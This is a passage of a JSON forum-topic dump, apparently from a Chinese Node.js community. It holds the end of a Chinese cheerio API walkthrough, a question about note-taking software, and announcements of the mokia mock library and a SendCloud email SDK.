fruit&quot;&gt;Pear&lt;&#x2F;li&gt;\n\n$(&#x27;.apple&#x27;).addClass(&#x27;fruit red&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;apple fruit red&quot;&gt;Apple&lt;&#x2F;li&gt;\n</code></pre><p>更多信息看<a href=\"http://api.jquery.com/addClass/\">这里</a></p>\n<p><strong>.removeClass([className])</strong></p>\n<p>从选择的elements里去除一个或多个有空格分开的class。如果className 没有定义，所有的classes将会被去除，也可以传函数。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).removeClass(&#x27;pear&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;&quot;&gt;Pear&lt;&#x2F;li&gt;\n\n$(&#x27;.apple&#x27;).addClass(&#x27;red&#x27;).removeClass().html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;&quot;&gt;Apple&lt;&#x2F;li&gt;\n</code></pre><p>更多信息看<a href=\"http://api.jquery.com/removeClass/\">这里</a></p>\n<p><strong>.is.(selector)</strong></p>\n<p><strong>.is(function(index))</strong></p>\n<p>有任何元素匹配selector就返回true。如果使用判定函数，判定函数在选中的元素中执行，所以this指向当前的元素。</p>\n<p>####Traversing</p>\n<p><strong>.find(selector)</strong></p>\n<p>获得一个在匹配的元素中由选择器滤过的后代。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;#fruits&#x27;).find(&#x27;li&#x27;).length\n&#x2F;&#x2F;=&gt; 3\n</code></pre><p><strong>.parent([selector])</strong></p>\n<p>获得每个匹配元素的parent,可选择性的通过selector筛选。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).parent().attr(&#x27;id&#x27;)\n&#x2F;&#x2F;=&gt; fruits\n</code></pre><p><strong>.parents([selector])</strong></p>\n<p>获得通过选择器筛选匹配的元素的parent集合。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.orange&#x27;).parents().length\n&#x2F;&#x2F; =&gt; 2\n$(&#x27;.orange&#x27;).parents(&#x27;#fruits&#x27;).length\n&#x2F;&#x2F; =&gt; 1\n</code></pre><p><strong>.closest([selector])</strong></p>\n<p>对于每个集合内的元素，通过测试这个元素和DOM层级关系上的祖先元素，获得第一个匹配的元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.orange&#x27;).closest()\n&#x2F;&#x2F; =&gt; []\n$(&#x27;.orange&#x27;).closest(&#x27;.apple&#x27;)\n&#x2F;&#x2F; =&gt; []\n$(&#x27;.orange&#x27;).closest(&#x27;li&#x27;)\n&#x2F;&#x2F; =&gt; [&lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;]\n$(&#x27;.orange&#x27;).closest(&#x27;#fruits&#x27;)\n&#x2F;&#x2F; =&gt; [&lt;ul id=&quot;fruits&quot;&gt; ... &lt;&#x2F;ul&gt;]\n</code></pre><p><strong>.next()</strong>\n获得第一个本元素之后的同级元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.apple&#x27;).next().hasClass(&#x27;orange&#x27;)\n&#x2F;&#x2F;=&gt; true\n</code></pre><p><strong>.nextAll()</strong></p>\n<p>获得本元素之后的所有同级元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.apple&#x27;).nextAll()\n&#x2F;&#x2F;=&gt; [&lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;, &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;]\n</code></pre><p><strong>.prev()</strong></p>\n<p>获得本元素之前的第一个同级元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.orange&#x27;).prev().hasClass(&#x27;apple&#x27;)\n&#x2F;&#x2F;=&gt; true\n</code></pre><p><strong>.preAll()</strong></p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).prevAll()\n&#x2F;&#x2F;=&gt; [&lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;, &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;]\n</code></pre><p>获得本元素前的所有同级元素</p>\n<p><strong>.slice(start,[end])</strong></p>\n<p>获得选定范围内的元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;li&#x27;).slice(1).eq(0).text()\n&#x2F;&#x2F;=&gt; &#x27;Orange&#x27;\n\n$(&#x27;li&#x27;).slice(1, 2).length\n&#x2F;&#x2F;=&gt; 1\n</code></pre><p><strong>.siblings(selector)</strong></p>\n<p>获得被选择的同级元素，除去自己??</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).siblings().length\n&#x2F;&#x2F;=&gt; 2\n\n$(&#x27;.pear&#x27;).siblings(&#x27;.orange&#x27;).length\n&#x2F;&#x2F;=&gt; 1\n</code></pre><p><strong>.children(selector)</strong></p>\n<p>获被选择元素的子元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;#fruits&#x27;).children().length\n&#x2F;&#x2F;=&gt; 3\n\n$(&#x27;#fruits&#x27;).children(&#x27;.pear&#x27;).text()\n&#x2F;&#x2F;=&gt; Pear\n</code></pre><p><strong>.each(function(index,element))</strong></p>\n<p>迭代一个cheerio对象，为每个匹配元素执行一个函数。When the callback is fired, the function is fired in the context of the DOM element, so this refers to the current element, which is equivalent to the function parameter element.要提早跳出循环，返回false.</p>\n<pre class=\"prettyprint\"><code>var fruits = [];\n\n$(&#x27;li&#x27;).each(function(i, elem) {\n  fruits[i] = $(this).text();\n});\n\nfruits.join(&#x27;, &#x27;);\n&#x2F;&#x2F;=&gt; Apple, Orange, Pear\n</code></pre><p><strong>.map(function(index,element))</strong></p>\n<p>迭代一个cheerio对象，为每个匹配元素执行一个函数。Map会返回一个迭代结果的数组。the function is fired in the context of the DOM element, so this refers to the current element, which is equivalent to the function parameter element</p>\n<pre class=\"prettyprint\"><code>$(&#x27;li&#x27;).map(function(i, el) {\n  &#x2F;&#x2F; this === el\n  return $(this).attr(&#x27;class&#x27;);\n}).join(&#x27;, &#x27;);\n&#x2F;&#x2F;=&gt; apple, orange, pear\n</code></pre><p><strong>.filter(selector)</strong></p>\n<p><strong>.filter(function(index))</strong></p>\n<p>迭代一个cheerio对象，滤出匹配选择器或者是传进去的函数的元素。如果使用函数方法，这个函数在被选择的元素中执行，所以this指向的手势当前元素。</p>\n<p>Selector:</p>\n<pre class=\"prettyprint\"><code>$(&#x27;li&#x27;).filter(&#x27;.orange&#x27;).attr(&#x27;class&#x27;);\n&#x2F;&#x2F;=&gt; orange\n</code></pre><p>Function:</p>\n<pre class=\"prettyprint\"><code>$(&#x27;li&#x27;).filter(function(i, el) {\n  &#x2F;&#x2F; this === el\n  return $(this).attr(&#x27;class&#x27;) === &#x27;orange&#x27;;\n}).attr(&#x27;class&#x27;)\n&#x2F;&#x2F;=&gt; orange\n</code></pre><p><strong>.first()</strong></p>\n<p>会选择chreeio对象的第一个元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;#fruits&#x27;).children().first().text()\n&#x2F;&#x2F;=&gt; Apple\n</code></pre><p><strong>.last()</strong></p>\n<pre class=\"prettyprint\"><code>$(&#x27;#fruits&#x27;).children().last().text()\n&#x2F;&#x2F;=&gt; Pear\n</code></pre><p>会选择chreeio对象的最后一个元素</p>\n<p><strong>.eq(i)</strong></p>\n<p>通过索引筛选匹配的元素。使用.eq(-i)就从最后一个元素向前数。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;li&#x27;).eq(0).text()\n&#x2F;&#x2F;=&gt; Apple\n\n$(&#x27;li&#x27;).eq(-1).text()\n&#x2F;&#x2F;=&gt; Pear\n</code></pre><p>###Manipulation</p>\n<p>改变DOM结构的方法</p>\n<p><strong>.append(content,[content…])</strong></p>\n<p>在每个元素最后插入一个子元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;ul&#x27;).append(&#x27;&lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;&#x27;)\n$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;\n&#x2F;&#x2F;    &lt;&#x2F;ul&gt;\n</code></pre><p><strong>.prepend(content,[content,…])</strong></p>\n<p>在每个元素最前插入一个子元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;ul&#x27;).prepend(&#x27;&lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;&#x27;)\n$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;\n&#x2F;&#x2F;    &lt;&#x2F;ul&gt;\n</code></pre><p><strong>.after(content,[content,…])</strong></p>\n<p>在每个匹配元素之后插入一个元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.apple&#x27;).after(&#x27;&lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;&#x27;)\n$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;\n&#x2F;&#x2F;    &lt;&#x2F;ul&gt;\n</code></pre><p><strong>.before(content,[content,…])</strong></p>\n<p>在每个匹配的元素之前插入一个元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.apple&#x27;).before(&#x27;&lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;&#x27;)\n$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;\n&#x2F;&#x2F;    &lt;&#x2F;ul&gt;\n</code></pre><p><strong>.remove( [selector] )</strong></p>\n<p>从DOM中去除匹配的元素和它们的子元素。选择器用来筛选要删除的元素。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).remove()\n$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;    &lt;&#x2F;ul&gt;\n</code></pre><p><strong>.replaceWith( content )</strong></p>\n<p>替换匹配的的元素</p>\n<pre class=\"prettyprint\"><code>var plum = $(&#x27;&lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;&#x27;)\n$(&#x27;.pear&#x27;).replaceWith(plum)\n$.html()\n&#x2F;&#x2F;=&gt; &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;     &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;     &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;     &lt;li class=&quot;plum&quot;&gt;Plum&lt;&#x2F;li&gt;\n&#x2F;&#x2F;   &lt;&#x2F;ul&gt;\n</code></pre><p><strong>.empty()</strong></p>\n<p>清空一个元素，移除所有的子元素</p>\n<pre class=\"prettyprint\"><code>$(&#x27;ul&#x27;).empty()\n$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;&lt;&#x2F;ul&gt;\n</code></pre><p><strong>.html( [htmlString] )</strong></p>\n<p>获得元素的HTML字符串。如果htmlString有内容的话，将会替代原来的HTML</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.orange&#x27;).html()\n&#x2F;&#x2F;=&gt; Orange\n\n$(&#x27;#fruits&#x27;).html(&#x27;&lt;li class=&quot;mango&quot;&gt;Mango&lt;&#x2F;li&gt;&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;mango&quot;&gt;Mango&lt;&#x2F;li&gt;\n</code></pre><p><strong>.text( [textString] )</strong></p>\n<p>获得元素的text内容，包括子元素。如果textString被指定的话，每个元素的text内容都会被替换。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.orange&#x27;).text()\n&#x2F;&#x2F;=&gt; Orange\n\n$(&#x27;ul&#x27;).text()\n&#x2F;&#x2F;=&gt;  Apple\n&#x2F;&#x2F;    Orange\n&#x2F;&#x2F;    Pear\n</code></pre><p>###Rendering</p>\n<p>如果你想呈送document，你能使用html多效用函数。</p>\n<pre class=\"prettyprint\"><code>$.html()\n&#x2F;&#x2F;=&gt;  &lt;ul id=&quot;fruits&quot;&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;apple&quot;&gt;Apple&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n&#x2F;&#x2F;      &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;\n&#x2F;&#x2F;    &lt;&#x2F;ul&gt;\n</code></pre><p>如果你想呈送outerHTML,你可以使用 $.html(selector)</p>\n<pre class=\"prettyprint\"><code>$.html(&#x27;.pear&#x27;)\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;pear&quot;&gt;Pear&lt;&#x2F;li&gt;\n</code></pre><p>默认的,html会让一些标签保持开标签的状态.有时候你想呈现一个有效的XML文档.例如下面这个:</p>\n<pre class=\"prettyprint\"><code>$ = cheerio.load(&#x27;&lt;media:thumbnail url=&quot;http:&#x2F;&#x2F;www.foo.com&#x2F;keyframe.jpg&quot; width=&quot;75&quot; height=&quot;50&quot; time=&quot;12:05:01.123&quot;&#x2F;&gt;&#x27;);\n</code></pre><p>然后为了呈现这个XML,你需要使用<code>xml</code>这个函数:</p>\n<pre class=\"prettyprint\"><code>$.xml()\n&#x2F;&#x2F;=&gt;  &lt;media:thumbnail url=&quot;http:&#x2F;&#x2F;www.foo.com&#x2F;keyframe.jpg&quot; width=&quot;75&quot; height=&quot;50&quot; time=&quot;12:05:01.123&quot;&#x2F;&gt;\n</code></pre><p>###Miscellaneous</p>\n<p>不属于其它地方的DOM 元素方法</p>\n<p><strong>.toArray()</strong></p>\n<p>取得所有的在DOM元素，转化为数组、</p>\n<pre class=\"prettyprint\"><code>$(&#x27;li&#x27;).toArray()\n&#x2F;&#x2F;=&gt; [ {...}, {...}, {...} ]\n</code></pre><p><strong>.clone()</strong></p>\n<p>克隆cheerio对象</p>\n<pre class=\"prettyprint\"><code>var moreFruit = $(&#x27;#fruits&#x27;).clone()\n</code></pre><p>###Utilities</p>\n<p><strong>$.root</strong>\n有时候你想找到最上层的root元素,那么<code>$.root()</code>就能获得:</p>\n<pre class=\"prettyprint\"><code>$.root().append(&#x27;&lt;ul id=&quot;vegetables&quot;&gt;&lt;&#x2F;ul&gt;&#x27;).html();\n&#x2F;&#x2F;=&gt; &lt;ul id=&quot;fruits&quot;&gt;...&lt;&#x2F;ul&gt;&lt;ul id=&quot;vegetables&quot;&gt;&lt;&#x2F;ul&gt;\n</code></pre><p><strong>$.contains( container, contained )</strong></p>\n<p>查看cotained元素是否是container元素的子元素</p>\n<p><strong>$.parseHTML( data [, context ] [, keepScripts ] )</strong></p>\n<p>将字符串解析为DOM节点数组。context参数对chreeio没有意义，但是用来维护APi的兼容性。</p>\n<p>###Screencasts</p>\n<p><a href=\"http://vimeo.com/31950192\">http://vimeo.com/31950192</a></p>\n<p>这个视频教程是follow-up Nettut的&quot;How to Scrape Web Pages with Node.js and jQuery&quot;，用 cheerio而不是JSDOM+JQuery. 这个视频就是展示chreeio多牛B，多快的。</p>\n</div>","title":"通读cheerio API","last_reply_at":"2019-02-21T11:44:43.737Z","good":true,"top":false,"reply_count":29,"visit_count":137143,"create_at":"2013-08-08T14:11:36.535Z","author":{"loginname":"ggaaooppeenngg","avatar_url":"https://avatars.githubusercontent.com/u/4769989?v=3&s=120"}},{"id":"5c54046c05cc322e7b136ea7","author_id":"57d216e13d3520a5387c2b53","tab":"ask","content":"<div class=\"markdown-text\"><p>我知道一般程序员做笔记都用markdown，但是支持markdown的笔记软件也有很多。</p>\n<p>我之前都是用txt。\n优点只有一个：方便</p>\n<p>缺点一堆</p>\n<p>求推荐一个用起来顺手的。最好能登陆更新那种的。</p>\n</div>","title":"大家好，问个问题，请问大家遇到做笔记的时候用什么软件啊","last_reply_at":"2019-02-21T11:15:44.145Z","good":false,"top":false,"reply_count":17,"visit_count":1534,"create_at":"2019-02-01T08:33:48.295Z","author":{"loginname":"a69694510","avatar_url":"https://avatars1.githubusercontent.com/u/20507053?v=4&s=120"}},{"id":"5c6a7af354155543f0ba5419","author_id":"570b651894b38dcb3c09a823","tab":"share","content":"<div class=\"markdown-text\"><h1>Mokia</h1>\n<p><a href=\"https://github.com/varHarrie/mokia\">仓库地址</a></p>\n<p>一个集成了数据模拟和HTTP服务的Mock工具。</p>\n<h2>特性</h2>\n<ul>\n<li>🤟 简单易用</li>\n<li>🔄 模型可复用</li>\n<li>💎 支持TypeScript</li>\n</ul>\n<h2>安装</h2>\n<pre class=\"prettyprint language-bash\"><code>$ npm install mokia --save-dev\n# 或者\n$ yarn add mokia --dev\n</code></pre><h2>基本用法</h2>\n<ol>\n<li>添加一个文件，比如“mock.ts”：</li>\n</ol>\n<pre class=\"prettyprint language-typescript\"><code>import { mock, PORT, ServerConfig } from &#x27;mokia&#x27;\n\nconst config: ServerConfig = {\n  [PORT]: 3000,\n  &#x27;GET &#x2F;users&#x27;: () =&gt; {\n    return {\n      users: mock.array({\n        id: mock.uuid(),\n        name: mock.fullName()\n      }, 0, 5)\n    }\n  },\n  &#x27;GET &#x2F;users&#x2F;:id&#x27;: () =&gt; {\n    return {\n      id: mock.uuid(),\n      name: mock.fullName()\n    }\n  }\n}\n\nexport default config\n</code></pre><ol>\n<li>运行脚本启动服务器：</li>\n</ol>\n<pre class=\"prettyprint language-bash\"><code>$ npx mokia mock.ts\n</code></pre><h2>进阶用法</h2>\n<p>为了较少重复代码和保持代码复用性，我们推荐使用JS类风格书写：</p>\n<pre class=\"prettyprint language-typescript\"><code>import { decorators, mock, PORT, ServerConfig } from &#x27;mokia&#x27;\n\nclass User {\n  decorators.uuid()\n  id: string\n\n  decorators.fullName()\n  name: string\n}\n\nconst config: ServerConfig = {\n  [PORT]: 3000,\n  &#x27;GET &#x2F;users&#x27;: () =&gt; {\n    return {\n      users: mock.array(User, 0, 5)\n    }\n  },\n  &#x27;GET &#x2F;users&#x2F;:id&#x27;: () =&gt; {\n    return mock(User)\n  }\n}\n\nexport default config\n</code></pre><h2>APIs</h2>\n<h3>服务器配置参数：</h3>\n<ul>\n<li><code>HOST</code> 服务器主机，默认为<code>'localhost'</code></li>\n<li><code>PORT</code> 服务器端口号，默认为<code>8080</code></li>\n<li><code>PREFIX</code> URL前缀，默认为<code>''</code></li>\n<li><code>SILENT</code> 是否隐藏请求日志，默认为<code>false</code></li>\n</ul>\n<p>注意：这些参数传入时都不是字符串，而是<code>Symbol</code>，你应该从<code>mokia</code>包中引入。</p>\n<pre class=\"prettyprint language-typescript\"><code>import { PORT } from &#x27;mokia&#x27;\n\nexport default {\n  [HOST]: &#x27;localhost&#x27;,\n  [PORT]: 3000,\n  [PREFIX]: &#x27;&#x2F;apis&#x27;,\n  [SILENT]: true,\n  &#x2F;&#x2F; ...\n}\n</code></pre><h3>随机生成器</h3>\n<pre class=\"prettyprint\"><code>[已支持生成器列表](https:&#x2F;&#x2F;github.com&#x2F;varHarrie&#x2F;mokia&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md#%E7%94%9F%E6%88%90%E5%99%A8)</code></pre></div>","title":"一个简单易用的mock工具库——mokia","last_reply_at":"2019-02-21T06:17:20.379Z","good":false,"top":false,"reply_count":1,"visit_count":798,"create_at":"2019-02-18T09:29:23.814Z","author":{"loginname":"varHarrie","avatar_url":"https://avatars1.githubusercontent.com/u/14304201?v=4&s=120"}},{"id":"5c6cca1633b0b629ac843197","author_id":"53be3c03a3ccaece73ba0606","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/danielsss/mail-sc.js\">请不要吝啬您的 Star，您的支持便是对本人最大的鼓励。非常感谢</a></p>\n<p>A wrapped email sdk for <a href=\"https://www.sendcloud.net\">SendCloud</a></p>\n<p>Welcome PRs.</p>\n<h2>Requirements</h2>\n<ul>\n<li>Node.js &gt; v7.0.*</li>\n</ul>\n<h2>Dependencies</h2>\n<ul>\n<li>axios</li>\n<li>debug</li>\n</ul>\n<h2>Installation</h2>\n<pre class=\"prettyprint language-shell\"><code>npm i --save mail-sc.js\n</code></pre><h2>Usage</h2>\n<h4>Example 1: <a href=\"#aliases\">Recommended. See APIs</a></h4>\n<pre class=\"prettyprint language-js\"><code>const {\n  createClient, decomposeAddress, addressParser\n} = require(&#x27;mail-sc.js&#x27;);\nconst options = {apiKey: &#x27;your key&#x27;, apiUser: &#x27;your user&#x27;};\nconst sendCloud = createClient(options);\n\nconst address = &#x27;tester&lt;test_address@test.com&gt;&#x27;;\nconst decomposed = decomposeAddress(address);\n\nconst addr1 = [&#x27;test1@test.com&#x27;, &#x27;test2@test.com&#x27;];\nconst addr2 = &#x27;test1@test.com, test2@test.com,         test3@test.com&#x27;;\n\nconsole.log(addressParser(addr1));\n&#x2F;&#x2F; &#x27;test1@test.com;test2@test.com&#x27;\n\nconsole.log(addressParser(addr2, &#x27;,&#x27;));\n&#x2F;&#x2F; &#x27;test1@test.com;test2@test.com;test3@test.com&#x27;\n\nconst message = {\n  from: decomposed.address,\n  fromName: decomposed.name,\n  to: &#x27;test1@test,com&#x27;,\n  subject: &#x27;test subject&#x27;,\n  html: &#x27;test message&#x27;\n};\nconst sendMessage = async () =&gt; {\n  return await sendCloud.delivery.send(message);\n}\nsendMessage();\n</code></pre><h4>Example 2</h4>\n<pre class=\"prettyprint language-js\"><code>const {\n  SendCloud, decomposeAddress\n} = require(&#x27;mail-sc.js&#x27;);\nconst options = {apiKey: &#x27;your key&#x27;, apiUser: &#x27;your user&#x27;};\nconst sendCloud = new SendCloud(options);\n\nconst address = &#x27;tester&lt;test_address@test.com&gt;&#x27;;\nconst decomposed = decomposeAddress(address);\n\nconst message = {\n  from: decomposed.address,\n  fromName: decomposed.name,\n  to: &#x27;test1@test,com&#x27;,\n  subject: &#x27;test subject&#x27;,\n  html: &#x27;test message&#x27;\n};\nconst sendMessage = async () =&gt; {\n  return await sendCloud.send(message);\n}\n\nsendMessage();\n</code></pre><h2>SendCloud Options</h2>\n<ul>\n<li><code>apiKey</code> - The send cloud apiKey</li>\n<li><code>apiUser</code> - The send cloud apiUser</li>\n<li><code>host</code> - The hostname of send cloud api [<code>default</code>: <a href=\"http://api.sendcloud.net\">api.sendcloud.net</a>]</li>\n<li><code>protocol</code> - http|https [<code>default</code>: http]</li>\n<li><code>port</code> - [<code>default</code>: 80]</li>\n<li><code>retry</code> - [<code>default</code>: 1]</li>\n<li><code>proxy</code> - axios proxy [<code>default</code>: null]</li>\n<li><code>timeout</code> - axios timeout [<code>default</code>: 1000 * 6]</li>\n</ul>\n<h2>SendCloud Methods</h2>\n<h4>Deliveries</h4>\n<ul>\n<li><strong>.send(Object)</strong> -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/send_email/#regular-delivery\">Regular delivery</a></li>\n<li><strong>.sendTemplate(Object)</strong> -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/send_email/#template-delivery\">Template delivery</a></li>\n<li><strong>.sendCalendar(Object)</strong> -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/send_email/#send-meeting-calendar\">Send meeting calendar</a></li>\n<li><strong>.taskInfo(Object)</strong> -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/send_email/#http-request-method\">List task info</a></li>\n</ul>\n<h4>Email Template</h4>\n<ul>\n<li><strong>.batchQuery(Object)</strong>   -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/template_do/#query-batch-query\">Basic information of returned email template</a></li>\n<li><strong>.query(Object)</strong>    -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/template_do/#query\">Detailed information of returned email template</a></li>\n<li><strong>.add(Object)</strong>  -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/template_do/#add\">Adding template to sendCloud</a></li>\n<li><strong>.delete(Object)</strong>   -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/template_do/#query-batch-query\">Deleting email template from sendCloud</a></li>\n<li><strong>.modification(Object)</strong> -   <a href=\"http://www.sendcloud.net/doc/en/email_v2/template_do/#modification\">Name, content, subject and type of the template can be modified.</a></li>\n</ul>\n<h4>Address List</h4>\n<ul>\n<li><strong>.batchQueryAddressList(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/\">Query address list (batch query)</a></li>\n<li><strong>.addAddressList(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#add-address-list\">Adding address to list</a></li>\n<li><strong>.deleteAddressList(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#delete-address-list\">Deleting address list</a></li>\n<li><strong>.modifyAddressList(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#modify-address-list\">Modify address list or update address list</a></li>\n<li><strong>.batchQueryListMember(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#query-list-member-batch-query\">Query list member (batch query)</a></li>\n<li><strong>.queryListMember(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#query-list-member\">Query list member</a></li>\n<li><strong>.addListMember(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#add-list-member\">Add list member</a></li>\n<li><strong>.modifyListMember(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#modify-list-member\">Modify list member</a></li>\n<li><strong>.deleteListMember(Object)</strong>\t-\t<a href=\"http://www.sendcloud.net/doc/en/email_v2/list_do/#delete-list-member\">Delete list member</a></li>\n</ul>\n<h2>Aliases</h2>\n<ul>\n<li>all the method’s parameter same to <a href=\"#sendcloud-methods\">here</a></li>\n</ul>\n<h4>Deliveries</h4>\n<ul>\n<li><strong>delivery.send(Object)}</strong></li>\n<li><strong>delivery.sendTemplate(Object)}</strong></li>\n<li><strong>delivery.sendCalendar(Object)}</strong></li>\n<li><strong>delivery.taskInfo(Object)}</strong></li>\n</ul>\n<h4>Email Template</h4>\n<ul>\n<li><strong>template.batchQuery(Object)}</strong></li>\n<li><strong>template.query(Object)}</strong></li>\n<li><strong>template.add(Object)}</strong></li>\n<li><strong>template.delete(Object)}</strong></li>\n<li><strong>template.update(Object)}</strong></li>\n</ul>\n<h4>Address List</h4>\n<ul>\n<li><strong>addressList.batchQueryAddress(Object)}</strong></li>\n<li><strong>addressList.addAddress(Object)}</strong></li>\n<li><strong>addressList.deleteAddress(Object)}</strong></li>\n<li><strong>addressList.updateAddress(Object)}</strong></li>\n<li><strong>addressList.batchQueryMember(Object)}</strong></li>\n<li><strong>addressList.queryMember(Object)}</strong></li>\n<li><strong>addressList.addMember(Object)}</strong></li>\n<li><strong>addressList.updateMember(Object)}</strong></li>\n<li><strong>addressList.deleteMember(Object)}</strong></li>\n</ul>\n<h2>Planning implementations</h2>\n<h4>SendCloud APIs</h4>\n<ul>\n<li>[x] Deliveries</li>\n<li>[x] Email Template</li>\n<li>[x] Address List</li>\n<li>[ ] Email Label</li>\n<li>[ ] Domain</li>\n<li>[ ] API_USER</li>\n<li>[ ] User Information</li>\n<li>[ ] Statistics</li>\n<li>[ ] Delivery Response</li>\n<li>[ ] Bounce List Management</li>\n<li>[ ] Unsubscribe Management</li>\n<li>[ ] Spam Report Management</li>\n<li>[ ] Lists of Opens And Clicks Management</li>\n</ul>\n<h4>Build-in utilities</h4>\n<ul>\n<li>[x] .addressParser(addresses, tag) - Normalizing email address list or email string list</li>\n<li>[x] .decomposeAddress(address) - Decomposing an email address into fromName &amp; address</li>\n</ul>\n<ul>\n<li><a href=\"#example-1-recommended-see-apisaliases\">See details for utilities usage</a></li>\n</ul>\n</div>","title":"基于国内 SendCloud 平台实现的邮件相关 SDK。欢迎 PR 并求 